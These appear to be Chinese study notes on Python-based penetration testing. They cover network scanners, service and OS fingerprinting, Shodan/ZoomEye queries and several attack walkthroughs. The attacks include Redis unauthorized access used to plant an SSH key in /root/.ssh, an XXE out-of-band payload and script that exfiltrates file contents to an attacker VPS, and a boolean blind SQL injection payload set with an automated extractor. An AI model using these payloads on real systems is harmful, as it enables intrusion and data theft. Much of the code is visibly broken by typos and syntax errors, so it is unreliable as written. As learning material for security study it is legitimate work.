//编写一个利用TCP实现的活跃主机扫描程序
>>> ip = IP()
>>> tcp = TCP()
>>> r = (ip/tcp)
>>> r[IP].dst = "IP"
>>> r[TCP].flags = "A"
>>> a = st1(r)
>>> a.display()

//flags=R 即表示REST
----------------------------------------------------------------------------

import time
from optparse import OptionParser
from random import randint
from scapy.all import *

#Scan()函数
def main():
    usage = "Usage: %prog -i <ip address>"
    parse = OptionParser(usage=usage)
    parse.add_option("-i", '--ip', type="string", dest="targetIP", help="specify the IP address")

    options, args = parse.parse_args()
    if '-' in options.targetIP:
        for i in range(int(options.targetIP.split('-')[0].split('.')[3]), int((options.targetIP.split('-')[1]) + 1):
            Scan(options.targetIP.split('.')[0] + '.' + options.targetIP.split('.')[1] + '.' + options.targetIP.split('.')[2] + '.' + str(i))
    else:
        Scan(options.targetIP)

if __name__ == '__main__':
    main()

#若flags字段为R，其整型数值为4（REST）
def Scan(ip):
    try:
        dport = random.randint(1, 65535)
        packet = IP(dst=ip)/TCP(flags="A",dport=dport)
        response = sr1(packet, timeout=1.0, verbose=0)  #<----- verbose=0 (上一个是 基于ICMP的主机发现_Scapy库）
        if response:
            if int(resonse[TCP].flags) == 4:
                time.sleep(0.5)
                print(ip + ' ' + "is up")
            else:
                print(ip + ' ' + "is down")
        else:
            print(ip + ' ' + "is down")
    except:
        pass

//运行
// # python3 tcp_host.py -i X.X.X.120-130
// Wireshark --> REST的应答数据包如：[RST]
```

</details>

<details>
<summary>基于TCP、UDP的主机发现_UDP实现探测主机</summary>

```
//UDP   User Datagram Protocol,用户数据报协议
//主机活跃，但端口关闭，返回一个ICMP数据包 unreachable

//编写一个利用UDP实现的活跃主机的扫描程序_Scapy库_端口dport可以是任意值
>>> ip = IP()
>>> udp = UDP()
>>> r = (ip/UDP)
>>> r[IP].dport = 7345
>>> a = sr1(r)
>>> a.display()

# code= port-unreachable //目标主机存活
----------------------------------------------------------------------------
#!/usr/bin/python
import time
from optparse import OptionParser
from random import randint
from scapy.all import *

#Scan()函数
def main():
    usage = "Usage: %prog -i <ip address>"
    parse = OptionParser(usage=usage)
    parse.add_option("-i", '--ip', type="string", dest="targetIP", help="specify the IP address")

    optons, args = parse.parse_args()
    if '-' in options.targetIP:
        for i in range(int(options.targetIP.split('-')[0].split('.')[3]), int(options.targetIP.split('-')[1] + 1):
            Scan(options.targetIP.split('.')[0] + '.' + options.targetIP.split('.')[1] + '.' + options.targetIP.split('.')[2] + '.' + str(i))
    else:
        Scan(options.targetIP)
if __name__ == '__main__':
    main()

# proto字段整型数据为1，目标主机存活
def Scan(ip):
    try:
        dport = random.randint(1, 65535)
        packet = IP(dst=ip)/UDP(dport=dport)
        response = sr1(packet, timeout=1.0, verbose=0)
        if response:
            if int(response[IP].proto) == 1:
                time.sleep(0.5)
                print(ip + ' ' + "is up")
            else:
                print(ip + ' ' + "is down")
        else:
            print(ip + ' ' + "is down")
    except:
        pass

//运行
// # python3 udp_host.py -i X.X.X.105-140
//Wireshark ---> "Destionation unreachable (port unreachable)"
```

</details>

<details>
<summary>TCP、UDP_Nmap库</summary>

```
result = nm.scan(hosts=targetIP, arguments='-sT')
# python3 namp_TCP_find.py -i X.X.X.1-140

result = nm.scan(hosts=targetIP, arguments='-PU')
# python3 namp_UDP_find.py -i X.X.X.1-140
```

</details>

<details>
<summary>基于ARP的主机发现_Scapu库(Ether && ARP)</summary>

```
#ARP中 op 代表消息类型， 1为ARP请求， 2为ARP响应， hwsrc 为 源MAC地址，psrc为 源IP地址， pdst 为 目的IP地址

#!/usr/bin/python3
# -*- coding: utf-8 -*-
import os
import re
import optparse
from scapy.all import *

#通过正则表达式获取 IP地址和MAC地址
#re.search利用正则匹配返回第一个成功匹配的结果，存在结果则为true
def HostAddress(iface):

    ipData = os.popen('ifconfig ' + iface)  #os.popen执行后返回执行结果
    dataLine = ipData.readlines()     #对ipData进行类型转换，再用正则进行匹配
    if re.search('\w\w:\w\w:\w\w:\w\w:\w\w:\w\w', str(dataLine)): #取MAC地址
        MAC = re.search('\w\w:\w\w:\w\w:\w\w:\w\w:\w\w', str(dataLine)).group(0) #取出匹配结果
        if re.search(r((2[0-4]\d|25[0-5]|[01]?\d\d?)\.){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)', str(dataLine)): #取IP地址
            IP = re.search(r'((2[0-4]\d|25[0-5]|[01]?\d\d?)\.){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)', str(dataLine)).group(0)
    addressInfo = (IP,MAC)
return addressInfo

#编写ARP探测函数,自动生成目标进行探测
#发送ARP包，因为要用到OSI的二层和三层，所以要写成Ether/ARP,因为最低层用到了二层，所以要用srp()发包
def ArpScan(iface = 'eth0'):
    mac = HostAddress(iface)[1] //通过HostAddress返回的元组取出MAC
    ip =  HostAddress(iface)[0] //取出IP地址
    ipSplit = ip.split('.')
    ipList = []
    for i in range(1, 255):
        ipItem = ipSplit[0] + '.' + ipSplit[1] + '.' + ipSplit[2] + '.' + str(i)
        ipList.append(ipItem)
        result = srp(Ether(src = mac, dst = 'FF:FF:FF:FF:FF:FF')/ARP(op=1, hwsrc=mac,hwdst='00:00:00:00:00:00',pdst=iface,timeout=2,verbose=False)
        resultAns = result[0].res
    liveHost = [] //存活主机列表
    number = len(resultAns)  //number为接收到应答包的总数
    print("=======================")
    print("ARP 探测结果")
    print("本机IP地址:" + ip)
    print("本机MAC地址:" + mac)
    pritn("=======================")
    for x in range(number):  
        IP = resultAns[x][1][1].fields['psrc']
        MAC = resultAns[x][1][1].fields['hwsrc']
        liveHost.append([IP, MAC])
        print("IP:" + IP + "\n\n" + "MAC:" + MAC   )
        print("=======================")
    resultFile = open("result", "w")
    for i in range(len(liveHost)):
        resuttFile.write(liveHost[i][0] + "\n")
    resultFile.close()

if __name__ == '__ main__':
    parser = optpase.OptionParser('usage: python %prog -i interfaces \n\n' 'Example:python %prog -i eth0\n')
    parser.add_option('-i', '--iface', dest = 'iface', default='eht0', type = 'string', help = 'interfaces name')
    (options, args) = parser.parse_args()
    ArpScan(options.iface)

//运行
// # sudo python3 arpscaner.py -i the0
```

</details>

<details>
<summary>基于ARP的主机发现_Nmap库</summary>

```
result = nm.scan(hosts=tragetIP, arguments='-PR')

# python3 nmap_ARP_find.py -i 192.168.61.120-140
```

</details>


<details>
<summary>端口探测_Socket模块</summary>

```
#!/usr/bin/python3
# -*- coding:utf-8 -*-

import sys
import socket
import optparse
import threading
import queue

class PortScaner(threading.Thread):
    def __init__(self, portqueue, ip, timeout=3):
        threading.Thread.__init__(self)
        self._portqueue = portqueue
        self._ip = ip
        self._timeout = timeout

    def run(self):
        while True:
            if self._portqueue.empty():
                break
            port = self._portqueue.get(timeout = 0.5)
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(self._timeout)
                result_code = s.connect_ex((self._ip, port))
                # sys.stdout.write("[%d]Scan\n" % port)
                if result_code == 0:  #若端口开放，则会放回0
                    sys.stdout.write("[%d] OPEN\n" % port)
            excetp Exception as e:
                print(e)
            finally:
                s.close()

def StartScan(targetip, port, threadNum):
    portList = []
    portNumb = port
    if '-' in port:
        for i in range(int(port.split('-')[0]), int(port.split('-')[1])+1):
            portList.append(i)
    else:
        portList.append(int(port))
    ip = targetip
    threads = [] #线程列表
    threadNumber = threadNum #线程数量
    portQueue = queue.Queue() #队列端口

    for port in portList: #生成端口，加入端口队列
        portQueue.put(port)
    for t in range(threadNumber):
        threads.append(PortScaner(portQueue, ip, timeout=3))

    for thread in threads: #启动线程
        thread.start()
    for thread in threads: #阻塞线程
        thread.join()

if __name__ == '__main__':
    parser = optparse.OptionParser('Example: python %prog -i 127.0.0.1 -p 80 \n    python %prog -i 127.0.0.1 -p 1-100\n')
    parser.add_option('-i', '--ip', dest='targetIP',default='127.0.0.1', type = 'string', help = 'target IP')
    parser.add_option('p', '--port', dest = 'port', default = '80',type = 'string', help = 'scann port')
    parser.add_option('t', '--thread', dest = 'threadNum', default = 100, type = 'int', help = 'scann thread number')
    (options, args) = parser.parse_args()
    StartScan(option.targetIP, options.port, options.threadNum)

//运行
// $ ./scaner-port.py -i 192.168.61.166 -p 80
// $ ./scaner-port.py -i 192.168.61.166 -p 1-3500 -t 100
```

</details>

<details>
<summary>端口探测_Socket模块_Nmap库</summary>

```
result = nm.scan(hosts=tragetIP, arguments='-p'+str(targetPort))

# python3 nmap_port_find.py -i 192.168.61.128 -p 80,3306,25
```

</details>

<details>
<summary>服务识别</summary>

```
!#/usr/bin/python3.7
#!coding:urf-8
from optparse import OptionParser
import time
import socket
import re

SIGNS = (  #SIGNS值文库，用于对目标主机返回的banner信息进行匹配
    # 协议 | 版本 | 关键字
    b'FTP|FTP|^220.*FTP',
    b'MYSQL|MySQL|mysql_native_password',
    b'oracle-https|^220- ora',
    b'Telnet|Telnet|Telnet',
    b'Telnet|Telnet|^\r\n%connection closed by remote host!\x00$',
    b'VNC|VNC|^RFB',
    b'IMAP|IMAP|^\* OK.*?IMAP',
    b'POP|POP|^\+OK.*?',
    b'SMTP|SMTP|^220.*?SMTP',
    b'Kangle|Kangle|HTTP.kangle',
    b'SMTP|SMTP|^554 SMTP',
    b'SSH|SSH|^SSH-',
    b'HTTPS|HTTPS|Location: https',
    b'HTTP|HTTP|HTTP/1.1',
    b'HTTP|HTTP|HTTP/1.1',
    b'HTTP|HTTP|HTTP/1.0',
)

def main():
    parser = OptionParser("Usage:%prog -i <target host> ")
    parser.add_option('-i', type = 'string', dest = 'IP', help='specify target host')
    parser.add_option('-p', type = 'string', dest = 'PORT', help='specify target host')
    options,args = parser.parse_args()
    ip = options.IP
    port = option.PORT
    print("Scan report for "+ip+"\n")
    for line in port.split(','):
        request(ip,line)
        time.sleep(0.2)
    print("\nScan finished!...\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("interrupted by user, killing all threads...")

#在request()函数，调用sock.connect()函数探测目标主机端口是否开放
#利用sock.sendall()函数将PROBE探针发送给目标端口
#sock.recv()函数用于接收返回的指纹信息，并将指纹信息及端口发送到regex()函数
def request(ip, port):
    response = ''
    PROBE = 'GET / HTTP/1.0\r\n\r\n'
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    result = sock.connet_ex((ip, int(port)))
    if result == 0:
        try:
            sock.sendall(PROBE.encode())
            response = sock.recv(256)
            if response:
                regex(response, port)
        except(ConnetionResetError, socket.timeout):
            pass
    else:
        pass
    sock.close()

#利用re.search()函数将返回的banner信息与SIGNS包含的指纹信息进行正则匹配，并将匹配结果输出
#没有在SIGNS中找到相匹配的信息，则输出Unrecognized
def regex(response, port):
    text = ""
    if re.search(b'<title>502  Bad Gateway', response):
        proto = {"Service failed to access!!")
    for pattern in  SIGNS:
        pattern = pattern.split(b'|')
        if  re.search(pattern[-1], response, re.IGNORECASE):
            proto = "["+port+"]" + " open " + pattern[1]/decode()
            break
        else:
            proto = "["+port"]" + " open " + "Unrecognized"
        print(proto)

//运行
// # python3 port.py -i x.x.x.x -p21,22,80,443,3306,8888,9000,6379
```

</details>

<details>
<summary>服务识别_Nmap库</summary>

```
[1]result = nm.scan(hosts=targetIP, arguments = '-sV -p' + str(targetPort))

[2]print("[{}:{}] : [{}:{}]".format(targetPort, port_infor['state'] , port_infor['name'], port_infor['product']))

# python3 nmap_server_find.py -i IP -p 80,3306
```

</details>

<details>
<summary>系统识别</summary>

```
#windows TTL 128
#Linux TTL 64

#!/usr/bin/python3.7
#!coding:utf-8
from optparse import OptionParser
import os
import re

def main():
    parser = OptionParser("Usage:%prog -i <target host> " )
    parser.add_option('-i', type = 'string', dest = 'IP', help = 'specify target host')
    options, args = parser.parse_args()
    ip = options.IP
    ttl_scan(ip)

if __name__ == "__main__":
    main()

#调用os.popen()函数执行ping命令，并将返回的结果通过正则表达式识别re.compile()
def ttl_scan(ip):
    ttlstrmatch = re.compile(r'ttl=\d+')
    ttlnummatch = re.compile('r\d+')
    result = os.popen("ping -c 1 " + ip)
    res = result.read()
    for line in res.splitlines():
        result = ttlstrmatch.findall(line)
        if result:
            ttl = ttlnummatch.findall(result[0])
            if int(ttl[0]) <= 64:
                print("%s is Linux/UNIX "%ip)
            else:
                print("%s is Windows"%ip)
        else:
            pass

//运行
// # python3 sys_host.py -i IP
```

</details>

<details>
<summary>系统识别_Nmap库</summary>

```
result = nm.scan(hosts = targetIP, arguments = '-O')

# python3 nmap_system_scan.py -i IP
```

</details>

<details>
<summary>敏感目录探测</summary>

```
#先导入requests模块，等待用户输入url和字典
import requests
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0) Gecko/20100101 Firefox/6.0" }
url = input("url: ")
txt = input('php.txt;)

#当用户没有输入字典时，默认打开根目录的php.txt，然后将字典中的内容放进队列中
url_list = []
if txt == "":
    txt = "php.txt"
try:
    with open(txt, 'r') as f :
        for a  in f:
            a = a.replace('\n', '')
            url_list.append(a)
        f.close()
except:
    print("error! ")

#将队列中的内容拼接到url中组成需要验证的地址，通过返回值判断是否存在此目录
for li in url_list:
    conn = "http://" + url + "/" + li

    try:
        response = requests.get(conn, headers = headers)
        print("%s------------------------%s" %(conn, response))
    except e:
        print('%s--------------------%s', %(conn, e.code))
```

</details>

#### 网络空间引擎 Shodan,Censys,ZoomEye,Fofa,PunkSPIDER,IVER(Drunk),’傻 蛋‘

<details>
<summary>ZoomEye</summary>

```
//搜索语法

// app:"Apache httpd" +os:"linux" +country:US +city:"New York City"

// site:google.com +os:linux +country:US +city:"New York City"

//官方指导手册 https://www.zoomeye.org/doc
----------------------------------------------------------------------------
//方法一：通过curl命令直接获取access_token,其中username为邮箱或手机号码
curl -X POST https://api.zoomeye.org/user/login -d '{ "username":"xx@gmail.com", "password":"xxx"}'
----------------------------------------------------------------------------
//方法二：通过python脚本获取access_token,构造post请求方式，将用户和密码以json的格式发送到ZoomEye的后端，打印出响应数据包
#!/usr/bin/python
#coding:utf-8
import requests
import json

def main():
username = imput("username:")
password = input("password:")
url = "https://api.zoomeye.org/user/login:
data = json.dumps({'username': username, 'password': password})
access_key = requests.port(url=url, data = data, verify = False)

if __name__ == "__main__":
    main()

//运行
// # python3 ZoomEye_token.py
```
</details>

<details>
<summary>ZoomEye_查询开放6379端口的服务器IP地址_Redis数据库</summary>

```
#!/usr/bin/python
#coding:utf-8
import requests
from bs4 import BeautifulSoup
import json
import re

def main():
    headers = {
        "Authorization": "JwT eyJhbD****************"
    }
    url = "https://api.zoomeye.org/host/search?query=port:6370&page=1&facet=app,os"
    info = requests.get(url=url, headers=headers)
    r_decoded = json.loads(info.text)
    for line in r_decode['matches']:
        print(line['ip']+': 'str(line['portinfo']['port']))

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("interrupted by user, killing all threads...")

//运行
// # python3 ZoomEye.py
```

</details>

<details>
<summary>Shodan</summary>

```
//搜索语法

// city:"Beijing" port:80 os:"windows"

//官方PAI https://developer.shadan.io/api

//shodan_api.count(query, facets=None):查询结果数量
//shadan_api.host(ip, history=False):获取一个IP的信息信息
//shadan_api.ports():端口号
//shadan_api.protocols()
//shadan_api.servoces()
//shadan_api.scan(ips, force=False):使用Shodan进行扫描，ips可以为字符或字典类型
----------------------------------------------------------------------------
```

</details>

<details>
<summary>Shodan_获取host方法获取指定IP相关信息</summary>

```
import shodan
//初始化API
import json
SHODAN_API_KEY = 'Hg46p**************'
shodan_api=shodam.Shodan(SHODAN_API_KEY)

ip = shodan_api.host('8.8.8.8')
print(json.dumps(ip))

//运行结果：
// {"region_code": null, "ip": 134744072, "postal_code": null, "country_code":"US", ...."ip_str": "8.8.8.8", "os": null, "ports": [53]}
```

</details>

<details>
<summary>Shodan_搜索JAWS摄像头，将IP和端口打印出来</summary>

```
import shodan
import json
SHODAN_API_KEY = 'Hg4t6PpP**********'
shodan_api=shodan.Shodan(SHODAN_API_KEY)

results = shodan_api.search('JAWS/1.0')
print('Results found:%s"%results['total'])
for result in results['matches']:
    print(result['ip_str'] +":"+str(result['port']))

//运行
//python shodan.py
```

</details>

----------------------------------------------------------------------------
#### 漏洞检测与防御

<details>
<summary>Redis && SSH公钥文件</summary>

```
通常，服务上的Redis绑定在0.0.0.0:6379

~# redis-cli -h IP  //未授权访问
查看key和其对应的值：keys *
获取用户名 get user
获取登录指令 get password
删除所有数据 flushall

修改数据库的默认路径为/root/.ssh
默认缓存文件为 authorized.keys

将目标主机缓存的公钥作为value保存在authorized.keys文件中，这样就在服务器/root/.ssh下生成了一个授权的key
----------------------------------------------------------------------------
>>> ssh-keygen -t rsa

>>> cd /root/.ssh
>>> ls
>>> (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > key.txt
>>> cat /root/key.txt

//将txt文件中的公钥导入Redis缓存中
>>> cat /root/key.txt | redis-cli -h IP

# cat /root/key.txt | redis-cli -h IP -x set xxx //将运行结果导入Redis缓存

//连接到目标主机
>>> redis-cli -h IP
>>> config set dir /root/.ssh
>>> config set dbfilename authoruzed_keys
>>> save

>>> ssh IP 
----------------------------------------------------------------------------
```

</details>

<details>
<summary>Redis检测方法</summary>

```
if __name__ == '__main__':
    try:
        start(sys.argv[1:])
    except KeyboardIneterrupted by user, killing all threads...")

def start(argv):
    dict = {}
    url = ""
    tyrp = ""
    if len(sys.argv) < 2:
        print("-h 帮助信息;\n")
        sys.exit()
    try:
        banner()
        opts, args = getopt.getopt(argv, "-u:-p:-s:-h")
    except getopt.GetoptError:
        print('Error an argument!')
        sys.exit()
    for opt, arg in opts:
        if opt == "-u":
            url = arg
        elif opt == "-s":
            type == arg
        elif opt == "-p":
            port = arg
        elif opt == "-h":
            print(usage())
    launcher(url,type,port)

def banner():
    print("\033[1;34m#############################\033[1;32mXXXXXXXXXX\033[1;34###########################\033[0m\n')

def usage():
    print('-h: --help 帮助;')
    print('-p: --port 端口')
    print('-u: --url;')
    print('-s: --type Redis')
    sys.exit()

//运行
// # python3 redis_unauthorized_access.py -h

#利用recvdata()函数接收目标主机返回的数据，当返回的数据含有'redis version'字符串时，表明存在未授权访问漏洞，否则不存在
## 为授权函数检测
def redis_unanthoried(url, port):
    result = []
    s = socket.socket()
    payload = "\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a"
    socket.setdefaulttimelout(10)
    for ip in url:
        try:
            s.connect((ip, int(port)))
            s.sendall(payload.encode())
            recvdata = s.recv(1024).decode()
            if recvdata and 'redis_version' in recvdata:
                reuslt.append(str(ip) + ':' + str(port) + ':' + '\033[1;32;40msuccess\033[0m')
        except:
            pass
            result.append(str(ip) + ':' + str(port) + ':' + '\033[1;31;40mfailed \033[0m')
        s.close()
    return(result)

def url_exec(url):
    i = 0
    zi = []
    group = []
    group1 = []
    group2 = []
    li = url.split('.')
    if(url.find('-') == -1 ):
        group.append(url)
        zi = group
    else:
        for s in li:
            a = s.find('-')
            if a != -1:
                i = i + 1
        zi = url_list(li)
        if i > 1 :
            for li in zi:
                zz = url_list(li.split('.'))
                for ki in zz :
                    group.append(ki)
            zi = group
            i = i -1
        if i > 1:
            for li in zi:
                zzz = url_list(li.split('.')
                for ki in zzz:
                    group1.append(ki)
            zi = group1
            i = i - 1
        if i > 1 :
            for li in zi:
                zzzz = url_list(li.split('.'))
                for ki in zzzz:
                    group2.append(ki)
            zi = group2
    return zi

def output_exec(output,type):
    print("\033[1;32;34m"+type+".....\033[0m")
    print("+++++++++++++++++++++++++++++++++++++")
    print("|      ip     |     port     |     status    |")
    for  li in output:
        print("+------------+---------------+-------------+")
        print("|    "+li.replace(":","     |     ")+"    |  ")
    print("+-------------+-------------+------------+\n")
    pritn("[*] shutting down....")

//运行
// # python3 redis_unauthorized_access.py -u IP -p 6379 -s Redis
```

</details>

<details>
<summary>外部实体注入漏洞_XXE_OOB信息传送</summary>

```
----------------------------------------------------------------------------
<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY b SYSTEM "file:///c:/test.txt">
]>
<user>
  <username?&b;</username>
  <password>admin</password>
</user>
----------------------------------------------------------------------------
//无回响XXE：[1]注释掉 echo $result;[2]增加"error_reporting(0);"

//对无回响的XXE,需要构建一条 带外数据(Out-of Band,OOB)通道读取数据
//思路：
//1.攻击者先发送Payload1 给Web服务器
//2.Payload1 触发Web服务器，Web服务器向VPS获取恶意DTD,并执行Payload2
//3.Payload2使Web服务器把结果作为参数来访问VPS上的HTTP服务
//4.攻击者通过VPS的HTTP访问记录得到结果
----------------------------------------------------------------------------
在目标服务器无回响的情况下，只能通过OOB信息传送进行XXE攻击
----------------------------------------------------------------------------
//在VPS上创建名为evil.xml的恶意DTD文件，并将其放在apache的网页目录下，同时开启apache服务

//evil.xml
<!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http://192.168.1.130/?content=%file;'>"> %payload;

//在VPS上开启对apache访问日志的监控
# tail -f /var/log/apache2/access.log

<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=c:/text.txt">
<!ENTITY % dtd SYSTEM "http://192.168.1.130/evil.xml">
%dtd;
%send;
]>

#点击发送数据包，就可以在VPS上看到HTTP反问记录
//# tail -f /var/log/apache2/access.log
----------------------------------------------------------------------------
```

</details>

```
SimpleHTTPRequestHandler（Python自带HTTP服务器）

            │
            │继承
            ▼

        MyHandler（自己修改版）
```

<details>
<summary>外部实体注入漏洞_XXE_检测方法</summary>

```
----------------------------------------------------------------------------
// [1] "  "
// [2] <!  >     -->   "<!           > "
// [3] \"  \"    -->   "<!  \"      \"> "
// [4] <!  >     -->   "<!  \"<!    >\">  "
----------------------------------------------------------------------------
#!/usr/bin/python3
# -*- codign: utf-8 -*-

from http.server import HTTPServer, simpleHTTPRequestHandler
import threading
import requests
import sys

def ExportPayload(lop, lport):
    file = open('evil.xml', 'w')
    file.write("<!ENTITY % payload \"<!ENTITY &#x25; send SYSTEM 'http://{0}:{1}/?content=%file;'>\"> %payload;".form(lip, lport))
    file.close()
    print("[*] Payload文件创建成功!")

#编写HTTP服务函数，通过http.server模块实现HTTP服务，监听目标服务器返回的数据
def StartHTTP(lip,lport):
    serverAddr = (lip, lport)
    httpd = HTTPServer(serverAddr, MyHandler) //创建服务器对象
    print("[*] 正在开启HTTP服务器:\n\n===================\nIP地址：{0}\n端口：{1}\n============\n".format(lip, lport))
    httpd.serve_forever()    //让HTTP服务器一直运行，不听等待别人访问

#编写PORT发送函数，用来向目标服务器发送攻击数据
def SendData(lip, lport, url):
    filePath = "c:\\test.txt"
    while True:
        filePath = filePath.replace('\\', "/")
        data = "<?xml version=\"1.0\"?>\n<!DOCTYPE test [\n<!ENTITY  % file SYSTEM \"php://filter/read=convert.base64-encode/resource={0}\">
            \n<!ENTITY % dtd SYSTEM \"http://{1}:{2}/evil.xml\">\n%dtd;
            \n%send;\n].format(filePath, lip, lport)
        requests.port(url, data=data)
        filePath = input("Input filePath:")

class MyHandler(SimpleHTTPRequestHandler):
    def log_message(self, format, *args):  #重写父类的方法

        sys.stderr.write("%s - - [%s] %s\n" %  #终端输出HTTP访问信息
            (self.client_address[0],
            self.log_date_time_string(),
            format%args))

        textFile = open("result.txt", "a")
        textFile.write("%s - - [%s] %s\n" %
            (self.client_address[0],
            self.log_date_time_string(),
            format%args))
        textFile.close()

if __name__ == '__main__':
    lip = "192.168.1.130"
    lport = 3344
    url = "http://192.168.1.130/xxe-lab/php_xxe/doLogin.php"
    Export Payload(lip, lport)

    threadHTTP = threading.Thread(target=StartHTTP, args=(lip, lport)) #HTTP服务线程
    threadHTTP.start()

    threadPOST = threading.Thread(target=SendData, args=(lip, lport, url)) #发送POST数据线程
    threadPOST.start()

//运行
// # python3 Blind_XXE.py
```

</details>

<details>
<summary>外部实体注入漏洞_XXE_防御策略</summary>

```
[1]默认禁止外部实体的解析

[2]对用户提交的XML数据进行过滤，如关键词 <!DOCTYPE , <!ENTITY, SYSTEM, PUBLIC
```

</details>

<details>
<summary>SQL 基于布尔的盲注漏洞</summary>

```
----------------------------------------------------------------------------
//基于布尔的盲注：当页面没有回响位、不会输出SQL语句报错信息，通过返回页面响应的正常或不正常的情况进行注入
----------------------------------------------------------------------------
｜  库  ｜  表  ｜  字段  ｜  数据  ｜  

｜  长度  ｜  名  ｜  数量  ｜
----------------------------------------------------------------------------
>>> http://127.0.0.1/sql/Less-8/?id=1' and if(length(database())=8,1,0 %23  //数据库长度
>>> http://127.0.0.1/sql/Less-8/?id=1' and if(ascii(substr(database(),1,1))=115,1,0) %23  //数据库名
----------------------------------------------------------------------------
>>> http://127.0.0.1/sql/Less-8/?id=1' and if((select LENGTH(table_name) from information_schema.tables where table_schem='security' limit 1,1)=8,1,0) %23   //表名称的长度
>>> http://127.0.0.1/sql/Less-8/?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1), 1, 1))=101,1,0) %23  //表名
>>> http://127.0.0.1/sql/Less-8/?id=1' and if((select count(*)table_name from information_schema.tables where table_schema='security')=4,1,0) %23     //表的数量

>>> http://127.0.0.1/sql/Less-8/?id=1' and if(ascii(substr((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),1,1))=105,1,0) %23  //获取表的字段
>>> http://127.0.0.1/sql/Less-8/?id=1' and if((select count(column_name) from information_schema.columns where table_schema='security' and table_name='users' limit')=3,1,0) %23 //表的字段数量
----------------------------------------------------------------------------
>>> http://127.0.0.1/sql/Less-8/?id=1' and if((select length(column_name) from information_schema.columns where table_schema='security' and table_name='users' limit 0,1)=2,1,0) %23  //字段的长度

>>> http://127.0.0.1/sql/Less-8/?id=1' and if (ascii(substr((select username from users limit 0,1),1,1))=68,1,0) %23  //获取 字段数据
>>> http://127.0.0.1/sql/Less-8/?id=1' and if ((select length(username) from users limit 0,1)=4,1,0) %23   //字段数据的长度
>>> http://127.0.0.1/sql/Less-8/?id=1' and if ((select count(username) from users)=13,1,0) %23    //字段数据的数量
----------------------------------------------------------------------------
找数据库
length(database())
database()
----------------------------------------------------------------------------
找表
information_schema.tables
----------------------------------------------------------------------------
找字段
information_schema.columns
----------------------------------------------------------------------------
读数据
select username from users
select password from users
----------------------------------------------------------------------------
盲注核心模版

[1]if(条件,1,0)

条件成立 → 返回1,条件不成立 → 返回0

if(length(database())=8,1,0) #数据库名长度是不是8？

ascii(substr(database(),1,1))=115  #数据库第1个字符是不是 s ?
拆开 database -->   security
substr(database(),1,1)  -->    s
ascii('s')  --> 115

ascii(substr(database(),位置,1))=ASCII值
----------------------------------------------------------------------------
```

</details>

<details>
<summary>定义存储数据库的变量_request对象</summary>

```
!#/usr/bin/python3
# -*- coding: utf-8 -*-

improt requests
import optparse

DBName = ""
DBTable = []
DBColumns = []
DBData = {} #{字段名,数据列表}

flag = "You are in ...."  #若页面返回真

# 设置重连次数以及将连接改为短连接
# 防止 因为HTTP连接次数过多导致的 Max retries exceeded with url 问题
requests.adapters.DEFAULT_RETRIES = 5
conn = requests.session()
conn.keep_alive = False

# 盲注主函数
def StartSqli(url):
    GetDBName(url)
    print("[+] 当前数据库名:{0}".format(DBName))
    GetDBTables(url,DBName)
    print("[+]数据库{0}的表如下:".format(DBName))

    for item in range(len(DBTables)):
        print("(" + str(item + 1) + ")" + DBTables[item])
    tableIndex = int(input("[*]请输入要查看的表的序号:")) - 1
    GetDBColumns(url,DBName,DBTables[tableIndex])
    while True:
        print("[+] 数据表 {0} 的字段如下:".format(DBTables[tableIndex]))
        for item in range(len(DBColumns)):
            print("(" + str(item + 1) + ")" + DBColumns[item])
        columnIndex = int(input("[*] 请输入要查看的字段的序号(输入0退出):")) - 1
        if(columnIndex == -1):
            break
        else:
            GetDBData(url, DBTables[tableIndex], DBColumns[columnIndex])

#编写获取数据库的函数，根据得到的URL获取数据库名并把最后的结果存入DBName ---逐位枚举 数据库的长度、数据库名
def GetDBName(url):
    global DBName
    print("[-] 开始获取数据库名的长度")
    DBNameLen = 0
    payload = "' and if(length(database())={0},1,0) %23"
    targetUrl = url + payload
    for DBNameLen in range(1, 99):
        res = conn.get(targetUrl.format(DBNameLen))
        if flag in res.content.decode("utf-8"):
            print("[+]数据库名的长度:" + str(DBNameLen))
            break
    print("[-]开始获取数据库名")
    payload = "'and if(ascii(substr(database(),{0},1))={1},1,0) %23"
    targetUrl = url + payload

    for a in range(1, DBNameLen + 1):  # a表示 substr()函数的截取起始位置
        for b in range(33, 127):    #b表示在ASCII码中33-126位可显示的字符
            res = conn.get(targerUrl.format(a,b))
            if flag in res.content.decode("utf-8"):
                DBName += chr(b)
                print("[-]" + DBName)
                break

#编写获取数据库表的函数，根据获取到的URL和数据库名获取数据中的表，并把结果以列表的形式存入DBTables:
def GetDBTables(url, dbname):
    global DBTables
    DBTableCount = 0
    print("[-]开始获取{0}数据库表数据:".format(dbname))
    payload = "' and if((select count(*)table_name from information_schema.tables where table_schema='{0}')={1},1,0) %23"
    targetUrl = url + payload
    for DBTableCount in range(1, 99):
        res = conn.get(targetUrl.format(dbname, DBTableCount))
        if flag in res.content.decode("utf-8"):
            print("[+]{0}数据库中表的数量为:{1}".format(dbname, DBTableCount))
            break
    print("[-]开始获取{0}数据库的表".format(dbname))
    tableLen = 0
    for a in range(0, DBTableCount):
        print("[-]正在获取第{0}个表名".format(a+1))
        for tableLen in range(1, 99):
            payload = "' and if((select LENGTH(table_naem) from infromation_schem.tables where table_schema = '{0}' limit {1},1}={2},1,0) %23"
            targetUrl = url + payload
            res = conn.get(targetUrl.format(dbname, a, tableLen))
            if flag in res.content.decode("utf-8"):
                break

        table = ""
        for b in range(1, tableLen+1):
            payload = "' and if(ascii(substr((select table_name from information_schema.tables where table_schema='{0} limit {1},1),{2},1))={3},1,0) %23"
            targetUrl = url + payload
